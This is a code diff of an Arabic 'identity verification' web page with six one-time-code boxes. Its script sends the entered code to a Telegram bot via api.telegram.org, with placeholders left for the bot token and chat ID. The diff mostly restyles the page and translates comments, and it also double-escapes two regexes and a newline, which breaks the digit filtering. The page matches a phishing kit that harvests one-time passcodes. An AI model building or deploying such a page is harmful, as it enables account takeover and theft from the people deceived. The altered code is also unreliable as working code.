@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <title>التحقق من الهوية</title>
 <style>
 html, body {
@@ -12,6 +12,7 @@ html, body {
   background: #ffffff;
   font-family: "Tajawal", Arial, sans-serif;
   -webkit-font-smoothing:antialiased;
+  overflow: hidden; /* تثبيت الشاشة ومنع الانزلاق */
 }
 .wrap {
   width: 100%;
@@ -23,10 +24,11 @@ html, body {
   padding: 0 20px;
   background: #fff;
 }
-/* header fixed at the very top */
+
+/* header ثابت في أعلى الصفحة */
 .header-top {
   position: fixed;
-  top: 6px; /* very top */
+  top: 6px;
   left: 0;
   right: 0;
   display: flex;
@@ -37,7 +39,7 @@ html, body {
 .header-top a {
   pointer-events: auto;
   position: absolute;
-  left: 12px; /* arrow on the other side */
+  left: 12px; /* السهم على الجهة اليسرى */
   top: 0;
   text-decoration: none;
   font-size: 22px;
@@ -46,7 +48,7 @@ html, body {
 }
 .header-top span { font-weight: 700; font-size: 20px; color: #222; }
 
-/* title & subtitle under header */
+/* عنوان تحت الرأس */
 .title-area {
   margin-top: 56px;
   text-align: center;
@@ -64,7 +66,7 @@ html, body {
   line-height: 1.6;
 }
 
-/* inputs centered vertically and horizontally - slightly smaller boxes */
+/* المربعات في منتصف الشاشة (مركز عموديًا) */
 .center-area {
   position: absolute;
   left: 0;
@@ -76,36 +78,35 @@ html, body {
 }
 .code-inputs {
   display: flex;
-  gap: 8px; /* smaller gap */
+  gap: 6px; /* مسافة أصغر بين المربعات */
   align-items: center;
   width: calc(100% - 40px);
   max-width: 420px;
   justify-content: center;
 }
 .code-inputs input {
-  /* smaller responsive width to better fit narrow screens */
-  width: calc((100% - 40px) / 6);
-  max-width: 44px; /* smaller */
-  min-width: 28px;
+  width: calc((100% - 30px) / 6);
+  max-width: 36px;  /* تصغير أقصى */
+  min-width: 20px;  /* تصغير أدنى */
   aspect-ratio: 1 / 1;
   border-radius: 8px;
   border: 1px solid #e6e6e8;
   background: #f3f3f4;
-  box-shadow: 0 4px 8px rgba(0,0,0,0.03);
+  box-shadow: 0 3px 6px rgba(0,0,0,0.03);
   text-align: center;
-  font-size: 15px; /* smaller font */
+  font-size: 13px;
   color: #222;
   transition: background 0.12s, color 0.12s, box-shadow 0.12s;
 }
 .code-inputs input:focus { outline: none; border-color: #ddd; }
 .code-inputs input.filled {
-  background: #ffffff; /* become white when filled */
+  background: #ffffff; /* تصير بيضاء عند الملء */
   color: #000000;
   border-color: #e0e0e0;
-  box-shadow: 0 2px 6px rgba(0,0,0,0.04);
+  box-shadow: 0 2px 4px rgba(0,0,0,0.04);
 }
 
-/* bottom fixed area: resend above button */
+/* منطقة الأسفل ثابتة: عداد الإعادة فوق الزر */
 .bottom-fixed {
   position: fixed;
   left: 0;
@@ -158,10 +159,10 @@ html, body {
 }
 #nextBtn.active { background: #ff6a2b; color: #fff; }
 
-/* responsive tweaks for small phones */
+/* استجابة للشاشات الصغيرة */
 @media (max-width: 420px) {
   .title-area h2 { font-size: 26px; }
-  .code-inputs input { font-size: 14px; }
+  .code-inputs input { font-size: 12px; }
   .circle { width: 36px; height: 36px; }
   .circle svg { width: 36px; height: 36px; }
 }
@@ -181,12 +182,12 @@ html, body {
 
   <div class="center-area">
     <div class="code-inputs">
-      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code">
-      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code">
-      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code">
-      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code">
-      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code">
-      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code">
+      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code" />
+      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code" />
+      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code" />
+      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code" />
+      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code" />
+      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code" />
     </div>
   </div>
 
@@ -209,7 +210,7 @@ html, body {
 </div>
 
 <script>
-// 🔹 ضع بيانات بوت التلجرام هنا
+// ضع بيانات بوت التلجرام هنا إذا رغبت بإرسال الرمز
 const BOT_TOKEN = "ضع_هنا_التوكن";
 const CHAT_ID = "ضع_هنا_الآي_دي";
 
@@ -219,23 +220,19 @@ const resendText = document.getElementById('resendText');
 const countdownEl = document.getElementById('countdown');
 const progressCircle = document.querySelector('.progress');
 const circumference = 2 * Math.PI * 18;
-
 if (progressCircle) progressCircle.style.strokeDasharray = circumference;
 
 let timer;
 let timeLeft = 60;
-
 function startTimer() {
   timeLeft = 60;
   countdownEl.textContent = timeLeft;
   resendText.classList.remove('active');
-
   timer = setInterval(() => {
     timeLeft--;
     countdownEl.textContent = timeLeft;
     const offset = circumference - (timeLeft / 60) * circumference;
     if (progressCircle) progressCircle.style.strokeDashoffset = offset;
-
     if (timeLeft <= 0) {
       clearInterval(timer);
       countdownEl.textContent = '0';
@@ -243,14 +240,12 @@ function startTimer() {
     }
   }, 1000);
 }
-
 startTimer();
-
 resendText.addEventListener('click', () => {
   if (resendText.classList.contains('active')) startTimer();
 });
 
-// أرقام فقط + الانتقال التلقائي + اللصق لملء الحقول + تغيير اللون عند الملء
+// أرقام فقط + انتقال تلقائي + لصق لملء الحقول + تغيير الخلفية عند الملء
 inputs.forEach((input, idx) => {
   input.setAttribute('inputmode', 'numeric');
   input.setAttribute('pattern', '[0-9]*');
@@ -262,7 +257,7 @@ inputs.forEach((input, idx) => {
   });
 
   input.addEventListener('input', () => {
-    input.value = input.value.replace(/\D/g,'').slice(0,1);
+    input.value = input.value.replace(/\\D/g,'').slice(0,1);
     if (input.value) input.classList.add('filled'); else input.classList.remove('filled');
     if (input.value && idx < inputs.length-1) inputs[idx+1].focus();
     checkCode();
@@ -270,7 +265,7 @@ inputs.forEach((input, idx) => {
 
   input.addEventListener('paste', (e) => {
     e.preventDefault();
-    const paste = (e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'');
+    const paste = (e.clipboardData||window.clipboardData).getData('text').replace(/\\D/g,'');
     if (!paste) return;
     if (paste.length >= inputs.length) {
       for (let i=0;i<inputs.length;i++) {
@@ -296,14 +291,14 @@ function checkCode(){
 
 function sendToTelegram(code){
   if (!BOT_TOKEN || BOT_TOKEN.includes('ضع_هنا') || !CHAT_ID || CHAT_ID.includes('ضع_هنا')){
-    console.warn('Telegram credentials not set. Skipping fetch.');
-    alert('تنبيه: لم يتم ضبط بيانات بوت تلجرام. ضع قيم BOT_TOKEN و CHAT_ID الصحيحة في الكود لإرسال الرسائل.');
+    console.warn('بيانات التلجرام غير مضبوطة؛ تم تخطي الإرسال.');
+    alert('تنبيه: لم يتم ضبط بيانات بوت تلجرام. ضع قيم BOT_TOKEN و CHAT_ID الصحيحة إذا أردت إرسال الرسائل.');
     return Promise.resolve({ok:false,error:'credentials_missing'});
   }
-  const message = `🔑 تم إدخال رمز التأكيد:\n${code}`;
+  const message = `🔑 تم إدخال رمز التأكيد:\\n${code}`;
   return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-    method:'POST',headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({chat_id:CHAT_ID,text:message})
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({chat_id:CHAT_ID, text: message})
   })
   .then(res=>{ if(!res.ok) throw new Error('Telegram API returned status '+res.status); return res.json(); })
   .then(data=>{ console.log('تم الإرسال:',data); return data; })
@@ -313,7 +308,11 @@ function sendToTelegram(code){
 nextBtn.addEventListener('click', ()=>{
   let code = '';
   inputs.forEach(i=> code += i.value);
-  if (code.length===6){ sendToTelegram(code).catch(()=>{}); if (!BOT_TOKEN || BOT_TOKEN.includes('ضع_هنا') || !CHAT_ID || CHAT_ID.includes('ضع_هنا')) return; alert('🚀 تم إرسال رمز التأكيد إلى تلجرام'); }
+  if (code.length===6){
+    sendToTelegram(code).catch(()=>{});
+    if (!BOT_TOKEN || BOT_TOKEN.includes('ضع_هنا') || !CHAT_ID || CHAT_ID.includes('ضع_هنا')) return;
+    alert('🚀 تم إرسال رمز التأكيد إلى تلجرام');
+  }
 });
 </script>
 </body>
